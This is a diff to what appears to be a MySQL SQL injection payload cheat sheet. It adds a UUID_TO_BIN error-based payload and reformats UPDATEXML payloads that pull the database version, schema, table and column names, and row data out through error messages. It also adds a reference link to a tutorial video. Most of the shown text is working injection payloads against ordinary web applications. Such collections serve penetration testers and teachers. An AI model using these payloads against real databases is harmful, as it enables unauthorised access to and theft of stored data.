@@ -238,6 +238,7 @@ MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SE
 | EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
 | OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
 | NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
+| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |
 
 
 ### MYSQL Error Based - Basic
@@ -253,18 +254,18 @@ Works with `MySQL >= 4.1`
 ### MYSQL Error Based - UpdateXML Function
 
 ```sql
-AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
-AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
-AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
-AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
-AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
 ```
 
 Shorter to read:
 
 ```sql
-updatexml(null,concat(0x0a,version()),null)-- -
-updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
+UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
 ```
 
 
@@ -794,6 +795,7 @@ Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the back
 - [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased)
 - [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - March 2010](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
 - [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
+- [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://www.youtube.com/watch?v=u91EdO1cDak)
 - [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://resources.infosecinstitute.com/sql-truncation-attack/)
 - [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
 - [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
